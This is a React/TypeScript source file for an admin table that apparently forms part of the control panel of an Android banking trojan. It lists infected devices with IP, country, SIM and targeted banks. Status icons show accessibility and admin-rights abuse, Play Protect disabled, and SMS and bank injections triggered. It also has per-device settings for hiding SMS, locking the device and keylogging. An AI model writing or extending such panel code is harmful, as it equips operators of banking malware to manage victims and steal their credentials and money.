import React, { useEffect, useRef, useState, useContext } from 'react';
import { Table, Select, Pagination, Spin, Tag, Button, notification } from 'antd';
import type { TableRowSelection } from 'antd/lib/table/interface';
import type { ColumnsType } from 'antd/lib/table';
import { BotRowType, BotStateType, ServerResponseType } from '../../common/DataType';
import { getBotTable, getBotSetting, getBotShow, deleteBot } from './services';
import { BotContext } from './providers';
import { changeResponseToClient } from '../../common/Utility';

import { renderToString } from "react-dom/server"

import {
    BankOutlined,
    EyeOutlined,
    UserOutlined,
    PicLeftOutlined,
    SafetyCertificateOutlined,
    DollarCircleOutlined,
    BoxPlotOutlined,
    EyeInvisibleOutlined,
    PlayCircleOutlined,
    InfoCircleOutlined,
    SettingOutlined,
    MessageOutlined
} from '@ant-design/icons';
import CommentModal from './CommentModal';

const { Option } = Select

const BotsTable: React.FC = () => {
    const [selectedRowKeys, setSelectedRowKeys] = useState<React.Key[]>([]);
    const { state, setState } = useContext(BotContext)

    let firstUpdate = useRef(true)

    useEffect(() => {
        if (firstUpdate.current) {
            load()

            firstUpdate.current = true
        }
    }, [])

    const handleDelete = () => {
        if (!state.selectedBots.length) {
            notification['error']({
                message: 'ERROR',
                description: 'Select the bots to delete'
            })
            return
        }

        deleteBot(state.selectedBots).then((res: ServerResponseType) => {
            notification['info']({
                message: res.type.toUpperCase(),
                description: res.message
            })

            load()            
        })
    }

    const load = () => {

        setState((state: BotStateType) => {
            return {
                ...state,
                loading: true
            }
        })

        getBotTable(state.table.page, state.table.perPage, state.search.botId, state.search.country, state.search.app, state.search.operator, state.search.online, state.search.offine, state.search.dead, state.search.hasInjects, state.search.hasNotInjects, state.search.triggeredInject).then((res: any) => {
            setState((state: BotStateType) => {
                let rows = res.rows.map((row: any) => changeResponseToClient(row))

                return {
                    ...state,
                    loading: false,
                    table: {
                        ...state.table,
                        count: res.count,
                        rows: rows
                    }
                }
            })
        })

    }

    const servicesIcons = (record: BotRowType) => {

        let html = "<center>";

        // USER LOOK AT SCREEN
        if (Number(record.statScreen) === 1) {
            html += renderToString(<EyeOutlined title='User looks at the screen' className='!text-green-500' />)
        }
        else {
            html += renderToString(<EyeInvisibleOutlined title='User does not look at the screen' className='!text-stone-500' />)
        }
        html += ' ';

        // ACCESIBILITY STATUS
        if (Number(record.statAccessibility) === 1) {
            html += renderToString(<BoxPlotOutlined title='Accessibility enabled' className='!text-green-500' />)
        }
        else {
            html += renderToString(<BoxPlotOutlined title='Accessibility disabled' className='!text-stone-500' />)
        }
        html += ' ';

        // ADMIN RIGHTS STATUS
        if (Number(record.statAdmin) === 1) {
            html += renderToString(<UserOutlined title='There are admin rights' className='!text-green-500' />)
        }
        else {
            html += renderToString(<UserOutlined title='No admin rights' className='!text-stone-500' />)
        }
        html += ' ';

        // PROTECT STATUS
        if (Number(record.statProtect) === 0) {
            html += renderToString(<SafetyCertificateOutlined title='Play Protect disabled' className='!text-green-500' />)
        }
        else if (Number(record.statProtect) === 2) {
            html += renderToString(<SafetyCertificateOutlined title='Play Protect status not defined' className='!text-yellow-500' />)
        }
        else {
            html += renderToString(<SafetyCertificateOutlined title='Play Protect enabled' className='!text-stone-500' />)
        }
        html += ' ';

        if(Number(record.statSMS) === 1) {
            html += renderToString(<MessageOutlined title='SMS Injection Triggered' className='!text-green-500' />)
        }
        else {
            html += renderToString(<MessageOutlined title='SMS Injection not Triggered' className='!text-stone-500' />)
        }
        html += ' ';

        // BANK INJECT STATUS
        if (Number(record.statBanks) === 1) {
            html += renderToString(<DollarCircleOutlined title='Banks Injection Triggered' className='!text-green-500' />)
        }
        else {
            html += renderToString(<DollarCircleOutlined title='Banks Injection not Triggered' className='!text-stone-500' />)
        }
        html += ' ';

        // MODULE STATUS
        if (Number(record.statDownloadModule) === 1) {
            html += renderToString(<PicLeftOutlined title='Module loaded' className='!text-green-500' />)
        }
        else {
            html += renderToString(<PicLeftOutlined title='Module not loaded' className='!text-stone-500' />)
        }

        html += '</center>';

        return html;
    }

    useEffect(() => {
        load()
    }, [state.table.perPage, state.table.page, state.search])

    const onSelectChange = (newSelectedRowKeys: React.Key[]) => {
        setState((state: BotStateType) => {
            return {
                ...state,
                selectedBots: newSelectedRowKeys
            }
        })

        setSelectedRowKeys(newSelectedRowKeys);
    };

    const handleSetting = (botId: string) => {
        setState((state: BotStateType) => {
            return {
                ...state,
                botSettingModal: true
            }
        })

        getBotSetting(botId).then((res: any) => {

            res = changeResponseToClient(res)

            setState((state: BotStateType) => ({
                ...state,
                botId: botId,
                botSetting: {
                    hideSms: parseInt(res.hideSms),
                    lockDevice: parseInt(res.lockDevice),
                    offSound: parseInt(res.offSound),
                    keyLogger: parseInt(res.keyLogger)
                }
            }))
        })
    }

    const handleInfo = (botId: string) => {
        setState((state: BotStateType) => {
            return {
                ...state,
                botInfoModal: true
            }
        })

        getBotShow(botId).then((res: any) => {

            res = changeResponseToClient(res)

            setState((state: BotStateType) => ({
                ...state,
                botId: botId,
                bot: res
            }))
        })
    }

    const commentChange = (comment: string, botId: string) => {

        setState((state: BotStateType) => {
            return {
                ...state,
                comment: comment,
                botId: botId,
                commentChangeModal: true
            }
        })
    }

    const columns: ColumnsType<BotRowType> = [
        {
            title: '',
            render: (value: string, record: BotRowType) => {
                return (
                    <>
                        {/* <PlayCircleOutlined className='text-lg mr-1 !text-stone-400 hover:!text-stone-300 duration-300 cursor-pointer' /> */}
                        <InfoCircleOutlined className='text-lg mr-1 !text-stone-400 hover:!text-stone-300 duration-300 cursor-pointer' onClick={() => { handleInfo(record.id) }} />
                        <SettingOutlined className='text-lg mr-1 !text-stone-400 hover:!text-stone-300 duration-300 cursor-pointer' onClick={() => { handleSetting(record.id) }} />
                    </>
                )
            }
        },
        {
            title: 'Bot',
            dataIndex: 'id',
            render: (botId: string, record: BotRowType) => {
                return (
                    <div>
                        <div className='text-yellow-500 text-center'>{botId}</div>
                        <div className='text-center'>
                            <span dangerouslySetInnerHTML={{ __html: servicesIcons(record) }}></span>
                        </div>
                    </div>
                )
            }
        },
        {
            title: 'IP',
            dataIndex: 'ip',
            render: (ip: string, record: BotRowType) => {
                return (
                    <div>
                        <div className='justify-center'>
                            <img className='m-auto' src={`./images/flag/${record.country}.png`} />
                        </div>
                        <div className='text-center'>{ip}</div>
                    </div>
                )
            }
        },
        {
            title: 'Tag',
            dataIndex: 'tag',
        },
        {
            title: 'Time',
            dataIndex: 'lastConnect',
            render: (lastConnect: string) => {

                let time = parseInt(lastConnect)

                if (time < 10) {
                    return <span className='text-green-500'>Now</span>;
                }
                if (time < 60) {
                    return <span className='text-green-900'>{time}</span>;
                }
                else if (time < 3600) {
                    return <span className='text-orange-500'>{Math.floor(time / 60)} minutes</span>;
                }
                else if (time < 86400) {
                    return <span className='text-orange-900'>{Math.floor(time / 60 / 60)} hours</span>;
                }
                else {
                    return <span className='text-red-500'>{Math.floor(time / 60 / 60 / 24)} days</span>;
                }        
            }
        },
        {
            title: 'Android',
            dataIndex: 'version',
            render: (version: string) => {
                return (
                    <div><Tag>Android {version}</Tag></div>
                )
            }
        },
        {
            title: 'Bank',
            dataIndex: 'banks',
            render: (banks: string) => {
                let content = []
                if (banks != '') {
                    content = banks.split(':')

                    return (
                        <>
                            {content.map(item => {
                                return (
                                    <div className='flex'><BankOutlined className='mt-1' /> <div className=''>&nbsp;{item}</div></div>
                                )
                            })}
                        </>

                    )
                } else {
                    return (
                        <span>{banks}</span>
                    )
                }
            }
        },
        {
            title: 'Sim',
            dataIndex: 'sim',
        },
        {
            title: 'DateTime',
            dataIndex: 'createdAt',
        },
        {
            title: 'Comment',
            dataIndex: 'comment',
            render: (comment: string, record: BotRowType) => {
                return (<div className='w-full h-6 cursor-pointer text-stone-400 hover:text-stone-200 duration-300' onClick={() => {commentChange(comment, record.id)}}>{comment.length > 10 ? comment.substring(0, 10) + '...' : comment}</div>)
            }
        },
    ];

    const rowSelection: TableRowSelection<BotRowType> = {
        selectedRowKeys,
        onChange: onSelectChange,
        // selections: [
        //     Table.SELECTION_ALL,
        //     Table.SELECTION_INVERT,
        //     Table.SELECTION_NONE,
        //     {
        //         key: 'odd',
        //         text: 'Select Odd Row',
        //         onSelect: changableRowKeys => {
        //             let newSelectedRowKeys = [];
        //             newSelectedRowKeys = changableRowKeys.filter((_, index) => {
        //                 if (index % 2 !== 0) {
        //                     return false;
        //                 }
        //                 return true;
        //             });
        //             setSelectedRowKeys(newSelectedRowKeys);
        //         },
        //     },
        //     {
        //         key: 'even',
        //         text: 'Select Even Row',
        //         onSelect: changableRowKeys => {
        //             let newSelectedRowKeys = [];
        //             newSelectedRowKeys = changableRowKeys.filter((_, index) => {
        //                 if (index % 2 !== 0) {
        //                     return true;
        //                 }
        //                 return false;
        //             });
        //             setSelectedRowKeys(newSelectedRowKeys);
        //         },
        //     },
        // ],
    };

    return (
        <>
            <Select className='!mb-2' defaultValue={state.table.perPage} value={state.table.perPage} onChange={(v: string) => setState((state: BotStateType) => ({ ...state, table: { ...state.table, perPage: v } }))}>
                <Option value='10'>10 / page</Option>
                <Option value='20'>20 / page</Option>
                <Option value='30'>30 / page</Option>
                <Option value='50'>50 / page</Option>
            </Select>
            <Button danger ghost className='float-right' onClick={handleDelete}>Delete Selected Bots</Button>
            <Spin spinning={state.loading}>
                <Table rowSelection={rowSelection} columns={columns} dataSource={state.table.rows} pagination={false} />
            </Spin>
            <CommentModal/>
            <Pagination className='float-right !pt-2' defaultCurrent={state.table.page} total={state.table.count} pageSize={state.table.perPage} onChange={(page: number) => setState((state: BotStateType) => ({ ...state, table: { ...state.table, page: page } }))} />
        </>

    )
};

export default BotsTable;